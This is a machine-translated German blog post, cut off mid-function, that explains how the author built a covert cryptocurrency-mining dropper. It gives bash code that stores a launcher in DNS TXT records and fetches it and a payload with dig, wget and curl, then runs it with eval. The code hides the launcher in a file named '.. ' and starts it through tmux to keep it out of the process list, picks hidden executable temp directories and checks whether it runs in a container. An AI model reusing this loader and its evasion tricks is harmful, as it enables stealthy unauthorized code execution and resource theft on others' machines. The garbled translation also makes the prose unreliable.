both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2022,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Chroniken eines Cryptonote-Tropfers</title><script type=application/ld+json>{"url":"/de/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/de/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2022-02-02T18:36:34.318","inLanguage":"de","name":"","mainEntityOfPage":{"@id":"/de/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/de/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/de/posts/><i class="fas fa-pen menu-icons"></i> Beiträge</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/de/media/><i class="fas fa-tv menu-icons"></i> Medien</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/de/posts/><i class="fas fa-pen menu-icons"></i> Beiträge</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/de/media/><i class="fas fa-tv menu-icons"></i> Medien</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/de/posts/chronichles_of_a_cryptonote_dropper> Chroniken eines Cryptonote-Tropfers</a></h1><blockquote id=page-description style=font-style:italic>...Wie weit sind Sie bereit für ... Pfennige zu gehen?</blockquote></div><div class=franklin-content><p>Angenommen, du willst abbauen<a href=https://en.wikipedia.org/wiki/Cryptocurrency> Kryptowährungen</a> auf Fernbedienung<em> virtuell</em> Hardware. Du musst etwas für mich finden. Remote-Server bedeutet, nein<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> oder GPU-Proof-of-Work-Algorithmen, im Grunde nur<a href=\posts/a-few-notes-on-proof-of-work> CPU-freundliche Münzen</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Die Software</a></h2><p>Suchen und finden Sie a<a href=https://github.com/xmrig/xmrig> Bergmann</a> , aber es ist nicht wirklich schön, Sie möchten etwas, das Sie besser aus der Ferne steuern können, also finden Sie<a href=https://github.com/Bendr0id/xmrigCC> ein anderer Bergmann</a> . Sie wollen auch<a href=https://github.com/Bendr0id/xmrigcc-proxy> Stellvertreter</a> , denn viele Verbindungen werden nur von kurzer Dauer sein, das willst du nicht<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> DOS</a> Ihr Mining-Pool. Auch eine<a href=https://github.com/search?q=tunnel> Tunnel</a> wäre nett.<h2 id=the_design><a class=header-anchor href=#the_design> Das Design</a></h2><p>Einige Botnets verwenden Blockchain-Daten zum Nachschlagen von Befehlen,<a href=https://twitter.com/sarahjamielewis> jemand</a> scheint auch zu haben<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> verlorene Wetten</a> das passiert nicht wieder...sowieso sind wir nicht so raffiniert, wir werden mit einigen DNS-Einträgen auskommen, die ein Skript speichern, das die Nutzlast abruft, die selbstextrahieren in einem temporären Verzeichnis ausführt und verlässt<em> schon fast</em> keine Spur von seiner Einrichtung. Hier ist ein kleines Flussdiagramm, das den Aufbau darstellt<h2 id=launcher><a class=header-anchor href=#launcher> Startprogramm</a></h2><p>Der Sinn eines Startskripts besteht darin, zugänglich und leicht aktualisierbar zu sein, damit es dem Test der Zeit standhält. Aktualisierung<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a>Records ist einfach, und DNS ist das Letzte, was in einem Netzwerk heruntergefahren wird..weil IP-Adressen schwer zu merken sind. Siehst du, wenn wir es sind<em> Abrufen des Bereitstellungsskripts</em> Wir führen bereits eine gewisse Logik aus, dies ist das Launcher-Skript, es benötigt die Fähigkeit, DNS-Abfragen durchzuführen, um unsere Datensätze zu suchen, DNS könnte allgegenwärtig sein, aber<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> graben</a> ist nicht.<p>Es gibt hier ein kleines Rätsel, wenn wir ein anderes Tool herunterladen müssen<em> um ein weiteres Skript herunterzuladen um die Nutzlast herunterzuladen</em> Wir sollten einfach die Nutzlast herunterladen! Zur Verteidigung... dieser Skript-Tanz trägt zur Verschleierung bei, ermöglicht es, nur eine Implementierung des Launchers (Wartbarkeit, yay) zu behalten, ist meistens nicht erforderlich<a href=https://en.wikipedia.org/wiki/Standalone_program> statisch verknüpft</a> dig ausführbare Datei zum Ausführen von DNS-Abfragen, die entweder durch Selbst-Hosting oder Cloud-Hosting abgerufen wird (ja, es gibt Fallbacks wie 3 oder 4, da Cloud-Dienste eine sehr minimale freie Bandbreite haben und auch Cookies oder Zugriffstoken erfordern ... sie sind sehr Skripte unfreundlich, natürlich absichtlich).<p>Was steht in den DNS-Datensätzen? Wir benutzen<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> Datensätze, auf einer benutzerdefinierten Domain (auch hier Fallbacks). Warum TXT? sie sind zufällig diejenigen, die die größte Datenmenge speichern können<a href=https://www.ietf.org/rfc/rfc6763.txt> empfohlen</a> es hängt davon ab<em> Dinge</em> . Wir verwenden gezielt<a href=https://www.cloudflare.com/> Wolkenflare</a> für unser DNS-Fummeln, da es kostenlos ist und so ziemlich der einzige Spieler in der Stadt (<em> Nun, nicht wirklich, aber jede andere Alternative verblasst in Bezug auf die Funktionen</em> ). Es kommt vor, dass Sie mehrere Daten auf dem<em> gleich</em>aufzeichnen...das wird langsam verwirrend und krabbelt nach einigen Spezifikationen...(tangential) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> gewöhnt an</a> ermöglichen<em> angekettet</em> TXT-Einträge mit insgesamt ~9k Bytes, in den Dokumenten sind jetzt ~2k Bytes angegeben, vor der Änderung habe ich, glaube ich, ~6k verwendet und das Skript unkomprimiert bereitgestellt, danach musste ich das Skript ausdünnen und vorher komprimieren (eigentlich habe ich versucht, a . zu verwenden<a href=https://freedns.afraid.org/> befreit</a> Provider wurde ich innerhalb eines Tages gesperrt, da ich vermute, dass sie eine strikte Richtlinie für fettfreie TXT-Records haben), jedoch scheint die gzip-Komprimierung NICHT Pipe-freundlich zu sein und verursachte immer noch Probleme, sodass ich es schaffen musste, das Skript ohne Komprimierung zu stopfen ( Endtangente).<p>Wie speichern wir es? TXT-Einträge unterstützen nur alphanumerische Zeichenfolgen, nein<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> , also müssen wir es in eine Nicht-Null-Codierung einpacken,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> dieser Bedingung genügt, und weil wir speichern<em> angekettet</em> TXT-Records müssen wir die Ausgabe aufteilen, da wir Shell-Zeug verwenden, dies geschieht über die<code>-w</code> Flag, bei Busybox fehlte ein solches Flag (oder Opt-in) bei älteren Versionen, was ärgerlich war, eine Alternative besteht darin, den mit openssl gebündelten Encoder zu verwenden.<code>openssl enc -base64</code>.<p>Jetzt, da wir wissen, wie wir unser Bereitstellungsskript speichern, speichern wir es mit entweder<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> oder manuell. Wie ziehen wir es? Wir haben erwähnt, dass wir bindutils oder unsere eigenen brauchen<code>dig</code> ...nachdem wir den Serving-Endpunkt ausgewählt haben, möchten wir ihn herunterladen, was normalerweise verfügbar ist<a href=https://www.gnu.org/software/wget/> wget</a> oder<a href=https://curl.se/> Locken</a> , wget wird viel häufiger vorinstalliert gefunden, aber busybox bietet nur tls-Unterstützung mit dynamischen Bibliotheken, daher müssen Sie sicherstellen, dass der Endpunkt http bereitstellt oder Ihr Dienstprogramm dies tut<code>wget</code> von gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Es bedeutet versuchen<code>-t2</code>mal warten<code>-T10</code> Sekunden sein<code>-q</code> ruhige Lektüre von<code>-i-</code> stdin (<code>$digurl</code> ) und schreiben an<code>-O-</code> Standard (<code>$filename</code> ). Dieser Befehl verrät nicht auf den ersten Blick, was wir herunterladen. Wir werden aus dem gleichen Grund mit anderen Shell-Befehlen sehr vorsichtig sein oder bei der Shell bleiben (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) eingebaut, wenn möglich. Achten Sie auch darauf, wo Sie Ihre ausführbaren Dateien herunterladen. Sie möchten sicherstellen, dass Sie sie ausführen können, da einige Einhängepunkte, insbesondere in Containern und<code>tmp</code> Wege sind<code>noexec</code> . Jetzt, da wir unser DNS-Abfragetool haben, holen wir unsere Datensätze<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Flaggen sind hier selbsterklärend,<code>+short</code> bedeutet nur, dass wir nur an den Daten selbst interessiert sind, sodass wir die Ausgabe nicht analysieren müssen. Es ist wichtig, den DNS-Server anzugeben, z. B. google (<code>8.8.8.8</code> ) oder Wolkenflare (<code>1.1.1.1</code> ) weil viele Umgebungen DNS-Abfragen standardmäßig an ihre eigenen DNS-Server umleiten oder weiterleiten. Nachdem wir das chunked Skript geholt haben, kümmern wir uns um Anführungszeichen und Leerzeichen, um es für die Dekodierung vorzubereiten<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Was ist, wenn wir jetzt<em> still</em> Sie haben unseren Launcher nicht? DNS ist chaotisch, wir wollen einen Fallback, lassen Sie uns eine Subdomain einrichten, um das Launcher-Skript direkt abzurufen. Bevor wir unser Skript auswerten, möchten wir es mit einigen Variablen anpassen. Lassen Sie uns erneut einen TXT-Record verwenden, um eine NAME=VALUE-Variablenliste zu speichern und zu analysieren. Es gibt auch einen Fallback für Variablen, Cloudflare bietet Weiterleitungen basierend auf URLs an, diese Weiterleitungen werden bedient<em> Vor</em>das Ziel, also brauchen wir keinen Endpunkt, wir wollen nur Regex-basierte Umleitungsregeln zu einem fiktiven Endpunkt konfigurieren, was uns interessiert, sind die Parameter der URL<code>?NAME=VALUE&NAME2=VALUE2...</code> , damit wir unseren Launcher parametrisieren können, indem wir einfach die Weiterleitungs-URL ändern, immer unter Beachtung von Anführungszeichen und Escape-Codes<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Das wget<code>-S</code> gibt die Weiterleitungs-URL aus, an der wir zum Parsen interessiert sind. Mit den Parametern und dem Skript werten wir die Variablen aus und schreiben sie über eine Datei<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Diese Datei wird von einem Bereitstellungsskript bereitgestellt. Der letzte Teil des Startskripts besteht darin, zu aktualisieren<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> Trampolin</a> , werten Sie das Skript innerhalb des aktuellen Shell-Prozesses aus oder lassen Sie es nach Möglichkeit von tmux verwalten.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Das Launcher-Skript wird in eine Datei namens ".. " abgelegt. Dies sieht verwirrend aus, da es als a . verwechselt werden kann<em> Elternteil</em> Verzeichnis. Und wir fügen den Sitzungsbefehl nicht hinzu, da dieser im Prozessbefehl verweilen würde, stattdessen starten wir die tmux-Sitzung vorher und senden den Quellbefehl über die tmux-Terminalschnittstelle. In diesem Zusammenhang wird manchmal eine ausführbare Datei mit aufgerufen<code>./</code> behält diese Zeichen im Befehl, daher ist es besser, die hinzuzufügen<code>$PWD</code> zum Weg..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Die Nutzlast</a></h2><p>Unser Bereitstellungsskript beginnt mit der Beschaffung der<code>env.sh</code> Datei und behalten oder konfigurierte vars als<code>STARTING_*</code> vars wie<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Auf diese Weise können wir eine laufende Instanz beenden und neu starten, während die Umgebung zurückgesetzt wird. Wechseln wir zu einem tmp-Verzeichnis mit Exec-Fähigkeiten<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Prüfen, ob innerhalb von a<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> Container</a> ist auch praktisch, wir können das Dateisystem nach Hinweisen durchsuchen<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Jetzt ist es an der Zeit, unsere Nutzlast herunterzuladen. Wir unterstützen sowohl wget als auch curl, wir wissen bereits, wie man wget mit sorgfältigen Flags verwendet, für curl ist es ein bisschen anders. Wir müssen eine Konfigurationsdatei erstellen und überschreiben<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Der letzte Schritt besteht darin, nur die Nutzlast zu extrahieren<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Erwähnenswert ist die Verwendung eines [CDN] zur Wartung der Nutzlast. Auch hier erspart uns Cloudflare zur Rettung Bandbreitenausgaben. Durch einfaches Umbenennen unserer komprimierten Nutzlast in a<em> Dateierweiterung</em> unterstützt von cloudflare...es wird zwischengespeichert. Cloudflare überprüft nicht die Header dessen, was es bedient, vielleicht weil dies in diesem Umfang einfach unpraktisch ist.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Abenteuer in Baschland</a></h2><p>Bash wurde unter der Annahme ausgewählt, dass es portabel ist, nicht zu fehl am Platz aussieht und im Vergleich zu anderen Skriptsprachen wie Perl, Ruby oder Python allgegenwärtig ist. Die Wahrheit ist, dass eine eigenständige Binärdatei, die in Golang oder Lua geschrieben wurde, viel einfacher gewesen wäre, mit weniger Fehlern und einfacher zu warten gewesen wäre , es war zu spät für eine Neufassung, und es wurde auch irgendwie langweilig.<p>Es gab auch die Option, busybox mit dem Kompilierzeit-Flag zu verwenden, um alle Built-Ins (wie grep und sed) zu verwenden, aber die Verwendung von Built-Ins auf diese Weise erlaubt keine Jobs (Fork) zu erzeugen und setzt den Daemon potentiellen Deadlocks aus.<p>Ich werde hier einige Bash-Funktionen beschreiben, wobei die vollständige Liste verfügbar ist<a href=\assets/posts/bash_functions.txt> Hier</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Verwenden Sie die<code>RANDOM</code> Variable, um eine Zahl zwischen 97-122 zu erhalten, die einem Zeichencode entspricht, printf sollte ein eingebautes sein, wir wollen nicht in einer Schleife forken.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Nutzen Sie Pipes, um anonyme Dateideskriptoren zu erstellen. Diese verhalten sich nicht genau wie Dateideskriptoren, aber sie sind gut genug für<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Schlafen ohne Forking, indem die Timeout-Funktion des eingebauten Reads missbraucht wird, verwendet es einen dedizierten Dateideskriptor und wir müssen sicherstellen, dass er verfügbar ist, um eine Beendigung zu vermeiden.<p>Es gibt Funktionen wie<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> werden verwendet, um die Systemnutzung zu überwachen, diese verwenden alle Linux<code>/proc</code> Dateien ohne Tools wie<code>ps</code> , also kein Forking, alles pure Bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
